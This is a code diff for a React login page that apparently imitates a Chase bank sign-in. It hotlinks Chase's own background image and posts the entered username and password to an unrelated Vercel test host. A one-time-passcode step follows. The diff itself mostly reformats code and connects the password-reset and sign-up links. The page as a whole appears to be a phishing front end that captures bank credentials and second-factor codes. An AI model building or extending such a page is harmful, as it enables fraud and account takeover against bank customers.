@@ -17,55 +17,55 @@ export default function LoginPage() {
   const [rememberMe, setRememberMe] = useState(false);
   const router = useRouter();
 
-const handleLoginSubmit = async (e) => {
-  e.preventDefault();
-  if (!username || !password) {
-    setError("Enter your username and password.");
-    return;
-  }
-  
-  setError("");
-  setIsLoading(true);
-  
-  try {
-    // 1. Updated to your new Vercel URL (NO trailing slash!)
-    const apiUrl = process.env.NEXT_PUBLIC_API_URL;
+  const handleLoginSubmit = async (e) => {
+    e.preventDefault();
+    if (!username || !password) {
+      setError("Enter your username and password.");
+      return;
+    }
     
-    // 2. This now perfectly builds: https://wagwan-testpage.vercel.app/api/auth/login
-    const res = await fetch(`${apiUrl}/api/auth/login`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      credentials: "include", 
-      body: JSON.stringify({ username, password })
-    });
+    setError("");
+    setIsLoading(true);
     
-    const data = await res.json();
-    
-    if (!res.ok) {
-      if (res.status === 401) {
-        setError("Incorrect username or password.");
-      } else {
-        setError(data.error || "Login failed");
+    try {
+      // 1. Updated to your new Vercel URL (NO trailing slash!)
+      const apiUrl = process.env.NEXT_PUBLIC_API_URL;
+      
+      // 2. This now perfectly builds: https://wagwan-testpage.vercel.app/api/auth/login
+      const res = await fetch(`${apiUrl}/api/auth/login`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "include", 
+        body: JSON.stringify({ username, password })
+      });
+      
+      const data = await res.json();
+      
+      if (!res.ok) {
+        if (res.status === 401) {
+          setError("Incorrect username or password.");
+        } else {
+          setError(data.error || "Login failed");
+        }
+        setIsLoading(false);
+        return;
       }
+      
+      if (data.requiresOtp === false) {
+        router.push("/dashboard");
+        return;
+      }
+      
+      setMaskedEmail(data.maskedEmail);
+      setStep("otp");
+    } catch (err) {
+      setError("Network error. Please try again.");
+    } finally {
       setIsLoading(false);
-      return;
     }
-    
-    if (data.requiresOtp === false) {
-      router.push("/dashboard");
-      return;
-    }
-    
-    setMaskedEmail(data.maskedEmail);
-    setStep("otp");
-  } catch (err) {
-    setError("Network error. Please try again.");
-  } finally {
-    setIsLoading(false);
-  }
-};
+  };
 
-const handleOtpSubmit = async (e) => {
+  const handleOtpSubmit = async (e) => {
     e.preventDefault();
     if (otp.length < 6) return;
 
@@ -101,14 +101,9 @@ const handleOtpSubmit = async (e) => {
   };
 
   return (
-    /* 
-      CHANGED: Replaced 'min-h-screen' with 'h-screen overflow-y-auto'. 
-      This forces the container to take exactly the height of the screen and scroll its inner contents if they overflow.
-    */
     <div className="h-screen overflow-y-auto w-full bg-[#f4f4f4] font-sans">
       
       {/* HEADER BLOCK */}
-      {/* Set a fixed height of 400px so the math is perfect */}
       <div 
         className="w-full h-[400px] relative bg-cover bg-center shrink-0"
         style={{ backgroundImage: "url('https://asset.chase.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg')" }}
@@ -125,8 +120,6 @@ const handleOtpSubmit = async (e) => {
       </div>
 
       {/* FORM BLOCK */}
-      {/* -mt-[300px] pulls it up over the image. 
-          pb-24 adds space below the form before the footer hits. */}
       <div className="w-full px-4 relative z-10 -mt-[280px] pb-24 shrink-0">
         <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] mx-auto">
           
@@ -215,12 +208,20 @@ const handleOtpSubmit = async (e) => {
                 </button>
               </div>
 
-              {/* Links */}
+              {/* Links - Connected to the new pages */}
               <div className="space-y-4 pt-4">
-                <button type="button" className="flex items-center text-[#005eb8] hover:underline text-[15px]">
+                <button 
+                  type="button" 
+                  onClick={() => router.push('/forgot-password')}
+                  className="flex items-center text-[#005eb8] hover:underline text-[15px]"
+                >
                   Forgot username/password? <ChevronRight className="w-4 h-4 ml-1" />
                 </button>
-                <button type="button" className="flex items-center text-[#005eb8] hover:underline text-[15px]">
+                <button 
+                  type="button" 
+                  onClick={() => router.push('/signup')}
+                  className="flex items-center text-[#005eb8] hover:underline text-[15px]"
+                >
                   Not enrolled? Sign up now. <ChevronRight className="w-4 h-4 ml-1" />
                 </button>
               </div>
@@ -282,7 +283,6 @@ const handleOtpSubmit = async (e) => {
       </div>
 
       {/* FOOTER BLOCK */}
-      {/* Placed naturally at the bottom of the document flow */}
       <div className="w-full bg-white pt-8 pb-12 px-4 border-t border-gray-200 shrink-0">
         
         {/* SVGs for Social Icons */}
